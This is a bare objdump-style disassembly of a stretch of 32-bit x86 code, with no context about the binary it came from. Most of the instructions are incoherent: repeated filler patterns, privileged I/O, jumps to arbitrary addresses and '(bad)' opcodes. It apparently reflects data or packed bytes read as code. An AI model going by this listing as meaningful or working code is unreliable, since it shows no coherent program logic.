  4180a2:	xchg   ecx,eax
  4180a3:	sub    esi,DWORD PTR [ecx+0x7e]
  4180a6:	fs xor eax,0x26634875
  4180ac:	cs dec edx
  4180ae:	pop    esi
  4180af:	cs sub eax,0xa0ee8e4
  4180b5:	jmp    0x4189ec
  4180ba:	enter  0x5,0x0
  4180be:	enter  0x5,0x0
  4180c2:	fadd   DWORD PTR ds:0x5d80000
  4180c8:	add    BYTE PTR [eax],al
  4180ca:	enter  0x5,0x0
  4180ce:	enter  0x5,0x0
  4180d2:	cwde   
  4180d3:	add    eax,0x5980000
  4180d8:	add    BYTE PTR [eax],al
  4180da:	mov    BYTE PTR ds:0x5880000,al
  4180e0:	add    BYTE PTR [eax],al
  4180e2:	cwde   
  4180e3:	add    eax,0x5980000
  4180e8:	add    BYTE PTR [eax],al
  4180ea:	mov    BYTE PTR ds:0x5880000,al
  4180f0:	add    BYTE PTR [eax],al
  4180f2:	lds    ecx,FWORD PTR [edx-0x16e694b2]
  4180f8:	sub    BYTE PTR [eax+eax*1],al
  4180fb:	push   ds
  4180fc:	ins    BYTE PTR es:[edi],dx
  4180fd:	push   esp
  4180fe:	in     al,dx
  4180ff:	xor    eax,0x772d6268
  418104:	mov    BYTE PTR [edi],al
  418106:	push   edi
  418107:	inc    ebp
  418108:	mov    edi,0xb28c1105
  41810d:	gs in  al,0x80
  418110:	dec    edi
  418111:	dec    edi
  418112:	mov    ds,WORD PTR [eax]
  418114:	or     eax,0xd180000
  418119:	add    BYTE PTR [eax],al
  41811b:	or     BYTE PTR ds:0xd080000,cl
  418121:	add    BYTE PTR [eax],al
  418123:	sbb    BYTE PTR ds:0xd180000,cl
  418129:	add    BYTE PTR [eax],al
  41812b:	or     BYTE PTR ds:0xd080000,cl
  418131:	add    BYTE PTR [eax],al
  418133:	xor    DWORD PTR [edx-0x5dceffff],esp
  418139:	add    DWORD PTR [eax],eax
  41813b:	xor    DWORD PTR [edx-0x5dceffff],esp
  418141:	add    DWORD PTR [eax],eax
  418143:	xor    DWORD PTR [edx-0x5dceffff],esp
  418149:	add    DWORD PTR [eax],eax
  41814b:	xor    DWORD PTR [edx-0x5dceffff],esp
  418151:	add    DWORD PTR [eax],eax
  418153:	xor    DWORD PTR [edx-0x5dceffff],esp
  418159:	add    DWORD PTR [eax],eax
  41815b:	xor    DWORD PTR [edx+0x31000001],esp
  418161:	mov    ds:0xa2310001,al
  418166:	add    DWORD PTR [eax],eax
  418168:	xor    DWORD PTR [edx-0x5dceffff],esp
  41816e:	add    DWORD PTR [eax],eax
  418170:	xor    DWORD PTR [edx-0x5dceffff],esp
  418176:	add    DWORD PTR [eax],eax
  418178:	xor    DWORD PTR [edx-0x5dceffff],esp
  41817e:	add    DWORD PTR [eax],eax
  418180:	xor    DWORD PTR [edx-0x5dceffff],esp
  418186:	add    DWORD PTR [eax],eax
  418188:	xor    DWORD PTR [edx-0x5dceffff],esp
  41818e:	add    DWORD PTR [eax],eax
  418190:	xor    DWORD PTR [edx-0x5dceffff],esp
  418196:	add    DWORD PTR [eax],eax
  418198:	xor    DWORD PTR [edx-0x5dceffff],esp
  41819e:	add    DWORD PTR [eax],eax
  4181a0:	xor    DWORD PTR [edx-0x5dceffff],esp
  4181a6:	add    DWORD PTR [eax],eax
  4181a8:	xor    DWORD PTR [edx+0x9310001],esp
  4181ae:	out    0x3,eax
  4181b0:	xor    DWORD PTR [ecx],ecx
  4181b2:	out    0x3,eax
  4181b4:	xor    DWORD PTR [ecx],ecx
  4181b6:	out    0x3,eax
  4181b8:	xor    DWORD PTR [ecx],ecx
  4181ba:	out    0x3,eax
  4181bc:	xor    DWORD PTR [ecx],ecx
  4181be:	out    0x3,eax
  4181c0:	xor    DWORD PTR [ecx],ecx
  4181c2:	out    0x3,eax
  4181c4:	add    BYTE PTR [ecx],dh
  4181c6:	or     edi,esp
  4181c8:	add    esi,DWORD PTR [ecx]
  4181ca:	or     edi,esp
  4181cc:	add    esi,DWORD PTR [ecx]
  4181ce:	or     edi,esp
  4181d0:	add    esi,DWORD PTR [ecx]
  4181d2:	or     edi,esp
  4181d4:	add    esi,DWORD PTR [ecx]
  4181d6:	or     edi,esp
  4181d8:	add    esi,DWORD PTR [ecx]
  4181da:	or     edi,esp
  4181dc:	add    esi,DWORD PTR [ecx]
  4181de:	or     edi,esp
  4181e0:	add    esi,DWORD PTR [ecx]
  4181e2:	or     edi,esp
  4181e4:	add    esi,DWORD PTR [ecx]
  4181e6:	or     edi,esp
  4181e8:	add    esi,DWORD PTR [ecx]
  4181ea:	or     edi,esp
  4181ec:	add    esi,DWORD PTR [ecx]
  4181ee:	or     edi,esp
  4181f0:	add    esi,DWORD PTR [ecx]
  4181f2:	or     edi,esp
  4181f4:	add    esi,DWORD PTR [ecx]
  4181f6:	or     edi,esp
  4181f8:	add    esi,DWORD PTR [ecx]
  4181fa:	or     edi,esp
  4181fc:	add    esi,DWORD PTR [ecx]
  4181fe:	or     edi,esp
  418200:	add    esi,DWORD PTR [ecx]
  418202:	or     edi,esp
  418204:	add    esi,DWORD PTR [ecx]
  418206:	or     edi,esp
  418208:	add    esi,DWORD PTR [ecx]
  41820a:	or     edi,esp
  41820c:	add    esi,DWORD PTR [ecx]
  41820e:	or     edi,esp
  418210:	add    esi,DWORD PTR [ecx]
  418212:	or     edi,esp
  418214:	add    esi,DWORD PTR [ecx]
  418216:	or     eax,ebx
  418218:	adc    DWORD PTR [eax-0x3],esp
  41821b:	ror    DWORD PTR ds:0x50883931,cl
  418221:	mov    al,ds:0x95518e3e
  418226:	or     DWORD PTR [eax],eax
  418228:	jns    0x41822a
  41822a:	push   0x39
  41822c:	bound  ecx,QWORD PTR [ebx+0x4c752632]
  418232:	aas    
  418233:	cmp    eax,0xf8e5e977
  418238:	xor    BYTE PTR ds:0x4467b6e8,bl
  41823e:	cmp    dh,BYTE PTR es:[ecx-0x17]
  418242:	(bad)  
  418244:	xor    ch,dh
  418246:	leave  
  418247:	cld    
  418248:	xor    al,0xf1
  41824a:	xor    ah,dh
  41824c:	xor    edx,edi
  41824e:	(bad)  
  41824f:	mov    dh,0x60
  418251:	or     ecx,DWORD PTR [esi]
  418253:	out    0x31,al
  418255:	fidiv  DWORD PTR [edx]
  418257:	and    eax,0x2a601d63
  41825c:	push   DWORD PTR [bp+si]
  41825f:	cmp    eax,0x95efa63
  418264:	ins    BYTE PTR es:[edi],dx
  418265:	push   cs
  418266:	dec    ebx
  418267:	sub    al,BYTE PTR [eax]
  418269:	mov    eax,0xf8fff97c
  41826e:	push   ebp
  41826f:	cmp    BYTE PTR [ecx-0x22],dh
  418272:	inc    ebx
  418273:	cmp    esp,DWORD PTR [eax+ebx*1+0x35]
  418277:	and    DWORD PTR [ebx-0x3b],esp
  41827a:	push   ss
  41827b:	and    al,0x0
  41827d:	mov    esp,0xcc692723
  418282:	adc    eax,0x15bb6409
  418287:	sub    al,0x6d
  418289:	(bad)  
  41828a:	xor    bh,BYTE PTR ds:0x700b472
  418290:	cmp    eax,0xb63d966e
  418295:	xor    al,bl
  418297:	and    eax,0x32d82ee7
  41829c:	cs ins BYTE PTR es:[edi],dx
  41829e:	jle    0x4182f8
  4182a0:	sub    dh,BYTE PTR [edi+0x0]
  4182a3:	mov    edi,0xca30fff0
  4182a8:	mov    esi,0xb2c63531
  4182ad:	std    
  4182ae:	jb     0x418260
  4182b0:	in     al,dx
  4182b1:	arpl   WORD PTR [edi+0x57],bp
  4182b4:	or     eax,0xb14b322d
  4182b9:	xor    dh,BYTE PTR [esi]
  4182bb:	inc    edi
  4182bc:	mov    ch,0x36
  4182be:	add    BYTE PTR [ebx-0x1b],ch
  4182c1:	jno    0x41832c
  4182c3:	sbb    esi,ecx
  4182c5:	push   DWORD PTR [edx+0x5]
  4182c8:	sti    
  4182c9:	outs   dx,BYTE PTR ds:[esi]
  4182ca:	push   0x60fb71
  4182cf:	std    
  4182d0:	jmp    0x418340
  4182d2:	je     0x4182f9
  4182d4:	(bad)  
  4182d5:	jmp    DWORD PTR [edx+0x3f]
  4182d8:	clc    
  4182d9:	outs   dx,DWORD PTR ds:[esi]
  4182da:	jne    0x418320
  4182dc:	loopne 0x41834f
  4182de:	add    BYTE PTR [eax],bh
  4182e0:	jmp    DWORD PTR [esi+ebp*2+0x2b]
  4182e4:	loopne 0x418354
  4182e6:	jae    0x418280
  4182e8:	std    
  4182e9:	fs addr16 aaa 
  4182ec:	loopne 0x41835f
  4182ee:	add    BYTE PTR [esi],dh
  4182f0:	cli    
  4182f1:	push   0x74
  4182f3:	add    BYTE PTR [edx-0x14],ch
  4182f6:	imul   ebp,DWORD PTR [eax+ebx*2-0x14],0x6d
  4182fb:	addr16 jne 0x4182e3
  4182fe:	jmp    FWORD PTR [ecx+0x75]
  418301:	(bad)  
  418302:	jo     0x418377
  418304:	pop    ecx
  418305:	or     DWORD PTR ds:0x2fbc4b32,ebp
  41830b:	xor    ebx,DWORD PTR [eax-0xe]
  41830e:	addr16 popa 
  418310:	test   al,ah
  418312:	jne    0x418379
  418314:	call   0x63e1:0xb5726609
  41831b:	outs   dx,DWORD PTR ds:[esi]
  41831c:	xor    DWORD PTR [ebp+0x36886901],ecx
  418322:	sub    eax,0x24a2a363
  418327:	jno    0x4182be
  418329:	mov    WORD PTR [ecx],es
  41832b:	jno    0x4182c3
  41832d:	jg     0x418355
  41832f:	arpl   WORD PTR [ebx-0x7e8cc95e],ax
  418335:	inc    ebp
  418336:	imul   edx,DWORD PTR ss:[eax+0x44],0x4
  41833b:	imul   ebx,DWORD PTR [eax+0x3f],0x2c
  41833f:	pop    edi
  418340:	push   esp
  418341:	test   BYTE PTR [ebx],0x61
  418344:	dec    ecx
  418345:	inc    ebp
  418346:	and    eax,0x2aa25471
  41834b:	outs   dx,BYTE PTR ds:[esi]
  41834c:	cmp    eax,0x546e3645
  418351:	inc    BYTE PTR [ebx]
  418353:	push   0x46
  418355:	cvttps2pi mm6,QWORD PTR [ebx+0x0]
  418359:	adc    BYTE PTR [edx+0x7127327],ah
  41835f:	cmp    DWORD PTR [ebp+0x24],ebp
  418362:	mov    ds:0xaf0c6c23,al
  418367:	xor    al,0x63
  418369:	adc    eax,0x25f23a2
  41836e:	add    eax,0xb60d5f26
  418373:	add    DWORD PTR [ecx-0x3],esi
  418376:	shl    BYTE PTR [ebx],0x75
  418379:	ror    bh,1
  41837b:	xor    al,0x0
  41837d:	and    DWORD PTR [edx],edx
  41837f:	hlt    
  418380:	das    
  418381:	and    DWORD PTR [edx],edx
  418383:	add    al,0x70
  418385:	fsubr  QWORD PTR [edi+0x31]
  418388:	ins    BYTE PTR es:[edi],dx
  418389:	aam    0xa1
  41838b:	sub    ebp,DWORD PTR [ebp-0x3d]
  41838e:	lds    esp,FWORD PTR [edx]
  418390:	outs   dx,BYTE PTR ds:[esi]
  418391:	xor    esp,ecx
  418393:	and    ah,BYTE PTR [edi-0x43]
  418396:	or     BYTE PTR [edi-0x73c15ffd],cl
  41839c:	cs xchg edx,eax
  41839e:	aaa    
  41839f:	out    0x22,eax
  4183a1:	mov    al,ds:0x9e267b21
  4183a6:	or     DWORD PTR [ecx-0x7bc27fca],ecx
  4183ac:	xor    eax,0x228c2131
  4183b1:	xchg   DWORD PTR [esi],ebp
  4183b3:	jge    0x4183b8
  4183b5:	sub    DWORD PTR [esi],0x37523457
  4183bb:	out    0xf8,eax
  4183bd:	add    BYTE PTR ds:0x25f91dfc,bl
  4183c3:	cld    
  4183c4:	out    0x2b,al
  4183c6:	bound  esp,QWORD PTR [ebx]
  4183c8:	cmp    esp,DWORD PTR [edi]
  4183ca:	inc    ebx
  4183cb:	or     DWORD PTR [ebx+0x31],ecx
  4183ce:	aas    
  4183cf:	cs inc ebx
  4183d1:	cmp    esi,DWORD PTR [ecx]
  4183d3:	sub    bh,BYTE PTR ds:0x1e2e4328
  4183d9:	add    al,0x25
  4183db:	and    DWORD PTR [esi],ecx
  4183dd:	das    
  4183de:	push   es
  4183df:	cmp    bh,ah
  4183e1:	and    cl,BYTE PTR [edi]
  4183e3:	sub    al,0x4
  4183e5:	xor    BYTE PTR [eax],ah
  4183e7:	or     DWORD PTR [edx],ecx
  4183e9:	sub    al,0xee
  4183eb:	or     ebp,DWORD PTR ss:[ebx]
  4183ee:	adc    cl,BYTE PTR [ecx]
  4183f0:	or     esp,DWORD PTR [ebx]
  4183f2:	mov    cr0,esp
  4183f5:	xor    BYTE PTR [ecx],dh
  4183f7:	cli    
  4183f8:	pop    ss
  4183f9:	repz pop ds
  4183fb:	or     ecx,edx
  4183fd:	xlat   BYTE PTR es:[ebx]
  4183ff:	and    al,al
  418401:	sub    edx,edx
  418403:	ss out 0x34,eax
  418406:	into   
  418407:	and    cl,dh
  418409:	das    
  41840a:	ror    BYTE PTR [eax],cl
  41840c:	iret   
  41840d:	and    dl,bh
  41840f:	and    al,BYTE PTR [eax]
  418411:	enter  0x90a,0x6f
  418415:	enter  0x3df4,0x71
  418419:	mov    eax,ds:0x995f2132
  41841e:	bound  edi,QWORD PTR [edx]
  418420:	add    BYTE PTR [eax+eax*1-0x7f8dc2ad],al
  418427:	pop    edx
  418428:	or     DWORD PTR [eax-0x78],esi
  41842b:	inc    ebp
  41842c:	cmp    BYTE PTR [eax],al
  41842e:	mov    BYTE PTR [ebx+0x52],dl
  418431:	pop    edi
  418432:	mov    BYTE PTR [ebx+0x9],dl
  418435:	ss mov ah,0xfe
  418438:	stc    
  418439:	xor    DWORD PTR [eax],ebx
  41843b:	xor    eax,0x17486b52
  418440:	sub    eax,0x240ce95f
  418445:	je     0x418488
  418447:	add    al,0x23
  418449:	gs jmp 0x46afae66
  41844f:	sbb    BYTE PTR [edi],dh
  418451:	add    BYTE PTR [esi+ecx*1+0x3d],al
  418455:	push   0x71090344
  41845a:	pop    ss
  41845b:	pop    esi
  41845c:	and    al,0x70
  41845e:	and    BYTE PTR ds:0x621a631f,ch
  418464:	sub    ah,BYTE PTR [ecx+0x8]
  418467:	sub    eax,0x5215633c
  41846c:	and    al,0x6b
  41846e:	add    al,0x2d
  418470:	cmp    DWORD PTR [ebp+0x2],ebp
  418473:	dec    eax
  418474:	push   ds
  418475:	ins    DWORD PTR es:[edi],dx
  418476:	push   DWORD PTR [edx]
  418478:	sub    ch,BYTE PTR [esi+edx*8+0x24]
  41847c:	es ja  0x41844d
  41847f:	sub    edx,esp
  418481:	call   DWORD PTR [edi]
  418483:	fs jecxz 0x4184b4
  418486:	sbb    BYTE PTR [eax],al
  418488:	sub    eax,0x8b00731e
  41848d:	cli    
  41848e:	pop    esp
  41848f:	outs   dx,BYTE PTR ds:[esi]
  418490:	outs   dx,DWORD PTR ds:[esi]
  418491:	push   es
  418492:	push   0x68f67465
  418497:	gs dec eax
  418499:	loopne 0x41850b
  41849b:	jae    0x418469
  41849d:	in     al,0x6d
  41849f:	add    dl,al
  4184a1:	in     al,dx
  4184a2:	outs   dx,BYTE PTR ds:[esi]
  4184a3:	ins    DWORD PTR es:[edi],dx
  4184a4:	mov    cl,0xe3
  4184a6:	pusha  
  4184a7:	add    BYTE PTR [edi-0x4091a308],dl
  4184ad:	loopne 0x4184ae
  4184af:	jae    0x41845e
  4184b1:	div    BYTE PTR [ebx+0x69]
  4184b4:	mov    dh,0xea
  4184b6:	jmp    DWORD PTR [eax+0x78]
  4184b9:	imul   BYTE PTR [ebx+0x65]
  4184bc:	fdivr  st,st(0)
  4184be:	arpl   WORD PTR fs:[eax+0x6d6c6be0],ax
  4184c5:	or     eax,0xe6696570
  4184ca:	pusha  
  4184cb:	add    BYTE PTR [ebx],cl
  4184cd:	loopne 0x41852d
  4184cf:	jb     0x41853e
  4184d1:	icebp  
  4184d2:	push   DWORD PTR [eax]
  4184d4:	enter  0x71ea,0x61
  4184d8:	imul   esp,eax,0xffffffff
  4184db:	jbe    0x41851e
  4184dd:	stc    
  4184de:	imul   ebp,DWORD PTR [ecx+0x39],0xfffffff8
  4184e2:	jmp    FWORD PTR [eax+0x34]
  4184e5:	loop   0x41855c
  4184e7:	gs inc ecx
  4184e9:	loop   0x41855b
  4184eb:	xor    al,BYTE PTR [eax]
  4184ed:	cwde   
  4184ee:	jecxz  0x418554
  4184f0:	arpl   WORD PTR [edi],si
  4184f2:	stc    
  4184f3:	pusha  
  4184f4:	add    BYTE PTR [esi-0x41c9cc45],bh
  4184fa:	mov    ebx,0xeb8d6cfd
  4184ff:	imul   esi,DWORD PTR gs:[esi+0x5],0xd4316163
  418507:	sub    BYTE PTR [ebp-0x30],dh
  41850a:	fadd   DWORD PTR [ecx]
  41850c:	les    di,DWORD PTR [esi+0x7cd6772a]
  418513:	hlt    
  418514:	call   ecx
  418516:	outs   dx,BYTE PTR ds:[esi]
  418517:	xor    ch,BYTE PTR [eax-0x3a]
  41851a:	jae    0x418544
  41851c:	add    BYTE PTR [ecx-0x66a0d67f],bl
  418522:	add    DWORD PTR [ecx],0x31878e70
  418528:	add    BYTE PTR [ebx-0x7d8ed7d2],dl
  41852e:	cdq    
  41852f:	sub    esp,DWORD PTR [ebp+0x31]
  418532:	test   BYTE PTR ds:0x2d84895f,ch
  418538:	pop    edi
  418539:	mov    DWORD PTR [edx+0x52627730],esp
  41853f:	and    DWORD PTR [ecx+0x4c],esp
  418542:	adc    DWORD PTR [ebx+ebp*2],eax
  418545:	push   eax
  418546:	dec    esi
  418547:	cmp    BYTE PTR [eax+0x4c],ch
  41854a:	push   edi
  41854b:	add    al,0x61
  41854d:	push   eax
  41854e:	pop    eax
  41854f:	and    DWORD PTR [eax+eax*1+0x50],esp
  418553:	mov    ds:0xf04d6730,al
  418558:	and    al,0x72
  41855a:	xor    esp,esi
  41855c:	sub    ah,BYTE PTR [edx+0x14]
  41855f:	adc    al,0x38
  418561:	add    BYTE PTR [edi],cl
  418563:	push   DWORD PTR [ecx]
  418565:	arpl   WORD PTR [edi],sp
  418567:	std    
  418568:	xor    DWORD PTR [eax],eax
  41856a:	adc    BYTE PTR [ebx],dl
  41856c:	sub    BYTE PTR [esi+0x16],ah
  41856f:	sbb    al,BYTE PTR [edx+esi*2]
  418572:	adc    BYTE PTR [ebx],al
  418574:	sub    al,0x63
  418576:	or     eax,0x85f2fa2
  41857b:	mov    al,0x1f
  41857d:	ins    DWORD PTR es:[edi],dx
  41857e:	out    0x8,al
  418580:	out    0x24,eax
  418582:	loop   0x4185a5
  418584:	shl    DWORD PTR [edx],cl
  418586:	jecxz  0x418590
  418588:	xlat   BYTE PTR ds:[ebx]
  418589:	neg    BYTE PTR es:[esi]
  41858c:	aam    0x37
  41858e:	xor    DWORD PTR [ebx],ebp
  418590:	enter  0xda37,0x29
  418594:	int    0x3
  418596:	rcr    BYTE PTR [edi],1
  418598:	(bad)  
  418599:	sub    dh,cl
  41859b:	and    eax,0x228e21e7
  4185a0:	xchg   ebx,eax
  4185a1:	es sahf 
  4185a3:	or     DWORD PTR [edx-0x73d36fd4],ebx
  4185a9:	xor    DWORD PTR [esi+0x9],eax
  4185ac:	jl     0x4185d8
  4185ae:	nop
  4185af:	and    al,0x8c
  4185b1:	cmp    dh,BYTE PTR [ecx]
  4185b3:	sub    edx,DWORD PTR [eax+0x1e920037]
  4185b9:	mov    WORD PTR [ebx],es
  4185bb:	mov    DWORD PTR [esi],esp
  4185bd:	jnp    0x4185ee
  4185bf:	pop    esp
  4185c0:	cli    
  4185c1:	out    0x26,al
  4185c3:	pop    edx
  4185c4:	and    cl,BYTE PTR [ebp+0x27]
  4185c7:	dec    edx
  4185c8:	or     DWORD PTR [ebx+0x23],ecx
  4185cb:	dec    eax
  4185cc:	and    BYTE PTR [ebx+0x23],dl
  4185cf:	xor    DWORD PTR [eax+ecx*2],edi
  4185d2:	das    
  4185d3:	popw   ds
  4185d5:	xor    ebp,DWORD PTR [esi+ebx*2]
  4185d8:	or     DWORD PTR [edx+0x2d],ecx
  4185db:	dec    edx
  4185dc:	cmp    DWORD PTR [eax+0x33],ecx
  4185df:	xor    DWORD PTR ds:0x201a2310,esp
  4185e5:	or     eax,0x8353128
  4185ea:	cmp    eax,DWORD PTR ds:0x17041920
  4185f0:	and    cl,bh
  4185f2:	sbb    cl,BYTE PTR ss:[ecx]
  4185f5:	adc    DWORD PTR ds:0xba001f09,ebp
  4185fb:	xor    ebp,0xffffffff
  4185fe:	cli    
  4185ff:	sbb    ebp,DWORD PTR [edx]
  418601:	push   0x2520c8
  418606:	retf   
  418607:	push   cs
  418608:	sub    BYTE PTR [esi-0x3e],ch
  41860b:	arpl   di,si
  41860d:	xor    ecx,ebp
  41860f:	add    ch,BYTE PTR [edi+ebx*2]
  418612:	retf   0x2c1a
  418615:	jno    0x418600
  418617:	adc    DWORD PTR [esi],ebx
  418619:	ins    DWORD PTR es:[edi],dx
  41861a:	lds    eax,FWORD PTR [eax]
  41861c:	xor    ah,BYTE PTR [edi]
  41861e:	ins    BYTE PTR es:[edi],dx
  41861f:	mov    esi,0xe9722a65
  418624:	popa   
  418625:	sub    BYTE PTR [ebp-0x72],ch
  418628:	data16 sub dh,BYTE PTR [edx-0x17]
  41862c:	push   eax
  41862d:	dec    esi
  41862e:	outs   dx,BYTE PTR ds:[esi]
  41862f:	mov    BYTE PTR [esi+ecx*2+0x0],bl
  418633:	xchg   ebx,eax
  418634:	push   ebx
  418635:	and    ah,BYTE PTR [ebx+0x7a]
  418638:	xor    cl,BYTE PTR [esi+0x71]
  41863b:	lea    ecx,[esi+ecx*2+0x71]
  41863f:	test   DWORD PTR [ecx+ecx*1],edx
  418642:	jbe    0x418694
  418644:	push   cs
  418645:	xor    eax,0x91c5b6d
  41864a:	ins    BYTE PTR es:[edi],dx
  41864b:	inc    esi
  41864c:	or     esp,DWORD PTR ds:0xde353f6d
  418652:	xor    edx,edi
  418654:	std    
  418655:	xor    esp,DWORD PTR [ebx-0x17]
  418658:	(bad)  
  41865b:	cli    
  41865c:	mov    esp,0x6139ffdf
  418661:	dec    esi
  418662:	jb     0x418681
  418664:	pop    edi
  418665:	sub    ch,BYTE PTR [ecx-0x17]
  418668:	push   ebx
  418669:	sub    ch,BYTE PTR [ebp+0x1b]
  41866c:	push   edx
  41866d:	sub    al,BYTE PTR [eax]
  41866f:	push   ss
  418670:	pop    esp
  418671:	pop    ds
  418672:	outs   dx,BYTE PTR ds:[esi]
  418673:	add    BYTE PTR ds:0x296cfff7,dh
  418679:	jmp    0x7274:0x5256962
  418680:	add    BYTE PTR [ecx],dh
  418682:	jecxz  0x4186e8
  418684:	je     0x4186d7
  418686:	or     ch,BYTE PTR [ebx+0x6e]
  418689:	ins    BYTE PTR es:[edi],dx
  41868a:	(bad)  [ebp+0x65]
  41868d:	dec    eax
  41868e:	mov    ch,0x2f
  418690:	xor    edi,DWORD PTR [ecx-0x1c]
  418693:	pop    esi
  418694:	add    BYTE PTR [ebx-0x1e],bh
  418697:	arpl   WORD PTR fs:[ebx-0x17],sp
  41869b:	ins    DWORD PTR es:[edi],dx
  41869c:	add    BYTE PTR [edx-0x7],dh
  41869f:	ins    DWORD PTR es:[edi],dx
  4186a0:	imul   ebp,edi,0xc062fff3
  4186a6:	repz fs jae 0x4186b2
  4186aa:	cli    
  4186ab:	pop    esp
  4186ac:	jae    0x418669
  4186ae:	cli    
  4186af:	das    
  4186b0:	jb     0x418666
  4186b2:	or     DWORD PTR [ebp+0x75],ebx
  4186b5:	mov    ebx,esi
  4186b7:	outs   dx,BYTE PTR fs:[esi]
  4186b9:	or     bh,dh
  4186bb:	outs   dx,DWORD PTR ds:[esi]
  4186bc:	popa   
  4186bd:	jp     0x41869e
  4186bf:	je     0x4186c1
  4186c1:	mov    ecx,0x7e69690d
  4186c6:	add    eax,0xe17a6569
  4186cb:	outs   dx,BYTE PTR fs:[esi]
  4186cd:	enter  0x6aea,0x6f
  4186d1:	ja     0x4186b4
  4186d3:	pusha  
  4186d4:	add    BYTE PTR [esi-0x9],dh
  4186d7:	fs outs dx,BYTE PTR gs:[esi]
  4186da:	jmp    0xe2b1874d
  4186df:	outs   dx,DWORD PTR ds:[esi]
  4186e0:	gs cwde 
  4186e2:	mul    BYTE PTR [edi+0x61]
  4186e5:	add    BYTE PTR [edx+eiz*8],bh
  4186e8:	push   0x6ddc2e00
  4186ed:	je     0x418720
  4186ef:	std    
  4186f0:	sub    DWORD PTR [esi+ebx*1-0x60],esp
  4186f4:	and    eax,0x2b1b166d
  4186f9:	outs   dx,BYTE PTR ds:[esi]
  4186fa:	push   ss
  4186fb:	mov    al,ds:0x4035f29
  418700:	pop    ds
  418701:	ja     0x418734
  418703:	mov    bl,0x28
  418705:	ins    DWORD PTR es:[edi],dx
  418706:	fidivr DWORD PTR [esp+edi*1-0xee8da00]
  41870d:	xor    al,0x31
  41870f:	retf   0x712a
  418712:	aam    0xcf
  418714:	sub    DWORD PTR [eax],eax
  418716:	aad    0x6c
  418718:	imul   edi,DWORD PTR es:[eax-0x3198e261],0x9d5f2dc8
  418723:	mov    ds:0x9a9d0024,al
  418728:	xor    BYTE PTR [esi-0x6b],ch
  41872b:	test   DWORD PTR [ebx],esi
  41872d:	add    BYTE PTR [edx-0x678dd36e],ah
  418733:	xchg   esi,eax
  418734:	add    DWORD PTR [edx-0x70],esp
  418737:	xchg   esp,eax
  418738:	sbb    eax,0x20a28567
  41873d:	outs   dx,BYTE PTR ds:[esi]
  41873e:	jge    0x4187bd
  418740:	xor    eax,DWORD PTR [eax]
  418742:	push   eax
  418743:	sub    al,0x2d
  418745:	push   0x395456
  41874a:	add    BYTE PTR [edx+0x3b],dl
  41874d:	ss jbe 0x41879c
  418750:	dec    esi
  418751:	xor    BYTE PTR [ebx+0x31],ah
  418754:	dec    edx
  418755:	daa    
  418756:	popa   
  418757:	pop    edx
  418758:	cmp    eax,0x3b410039
  41875d:	das    
  41875e:	arpl   WORD PTR [ebx-0x5e],ax
  418761:	and    esp,DWORD PTR [ebx+0x1f]
  418764:	dec    eax
  418765:	and    DWORD PTR [ebx+0x18],ebp
  418768:	or     DWORD PTR ds:0xe1d1604,edx
  41876e:	xor    dl,BYTE PTR [edx]
  418770:	xor    al,BYTE PTR [esi]
  418772:	das    
  418773:	cs or  eax,ebx
  418776:	xor    al,BYTE PTR [ebx+0x34]
  418779:	mov    edx,0x1033311e
  41877e:	xor    al,0x12
  418780:	aaa    
  418781:	out    0x20,eax
  418783:	rcr    BYTE PTR [edx],cl
  418785:	add    al,0x35
  418787:	into   
  418788:	aaa    
  418789:	out    0x2c,eax
  41878b:	iret   
  41878c:	and    esi,eax
  41878e:	sub    ebx,ebp
  418790:	or     al,bl
  418792:	xor    dl,dl
  418794:	sar    DWORD PTR ss:[edx],cl
  418797:	push   ss
  418798:	or     edx,ecx
  41879a:	xor    eax,0x2ab329d2
  41879f:	mov    edi,0x9c21e725
  4187a4:	sbb    al,0xc9
  4187a6:	and    ah,BYTE PTR [ebx-0x69e077f7]
  4187ac:	and    eax,0x31003488
  4187b1:	aaa    
  4187b2:	xchg   BYTE PTR [edi],ch
  4187b4:	xchg   esi,eax
  4187b5:	push   ds
  4187b6:	add    BYTE PTR [ebx],0x80
  4187b9:	sbb    eax,0x37923a88
  4187be:	out    0x30,eax
  4187c0:	mov    ?,WORD PTR [eax]
  4187c2:	mov    ebp,DWORD PTR [eax]
  4187c4:	pop    edx
  4187c5:	or     DWORD PTR [edi+0x35],esi
  4187c8:	xchg   BYTE PTR [edx],ah
  4187ca:	pop    edx
  4187cb:	pop    ds
  4187cc:	xor    DWORD PTR [edi],ebp
  4187ce:	pop    edi
  4187cf:	and    eax,0x2745275f
  4187d4:	xor    DWORD PTR [eax],edi
  4187d6:	dec    eax
  4187d7:	daa    
  4187d8:	inc    edx
  4187d9:	es push ebx
  4187db:	add    al,0x4a
  4187dd:	and    dl,BYTE PTR [edx+0x1f]
  4187e0:	xor    DWORD PTR ds:0x1d594800,esp
  4187e6:	pop    edi
  4187e7:	cmp    ch,BYTE PTR ds:0x3e0c7226
  4187ed:	sbb    eax,DWORD PTR [eax]
  4187ef:	adc    eax,0x1d743a36
  4187f4:	cmp    dh,BYTE PTR cs:[ecx+ebp*8+0x4f]
  4187f9:	dec    esp
  4187fa:	jbe    0x418808
  4187fc:	inc    edi
  4187fd:	and    al,0x61
  4187ff:	adc    ch,BYTE PTR ds:0x190c6e1e
  418805:	push   ds
  418806:	jbe    0x41880c
  418808:	sub    eax,0xbdf5f25
  41880d:	and    eax,0x1d1bcc00
  418812:	ins    DWORD PTR es:[edi],dx
  418813:	fild   WORD PTR [eax]
  418815:	das    
  418816:	or     DWORD PTR [ecx-0x3f],esp
  418819:	pop    ss
  41881a:	aaa    
  41881b:	popa   
  41881c:	shl    DWORD PTR [edx],1
  41881e:	and    esi,DWORD PTR [edx-0x30]
  418821:	pop    ss
  418822:	sbb    esp,DWORD PTR [ecx+ebp*8+0x51]
  418826:	sbb    al,0x64
  418828:	jmp    0x9db2ae73
  41882d:	dec    ebx
  41882e:	sbb    esi,DWORD PTR [edi-0x17]
  418831:	dec    eax
  418832:	sbb    al,0x6e
  418834:	mov    WORD PTR [edx],?
  418836:	push   ds
  418837:	mov    bh,BYTE PTR [si]
  41883a:	sbb    al,0x71
  41883c:	xchg   esi,eax
  41883d:	push   eax
  41883e:	xor    eax,0xf8fcbb00
  418843:	xor    DWORD PTR [ebx+0x745faae4],edi
  418849:	or     al,0x27
  41884b:	ins    BYTE PTR es:[edi],dx
  41884c:	dec    esp
  41884d:	and    cl,BYTE PTR [ecx]
  41884f:	das    
  418850:	sbb    ah,bl
  418852:	fld    TBYTE PTR [esi]
  418854:	sbb    ah,al
  418856:	(bad)  
  418858:	dec    ecx
  418859:	push   cs
  41885a:	sub    BYTE PTR [edi+0x0],bl
  41885d:	imul   esp,edx,0x6b
  418860:	popa   
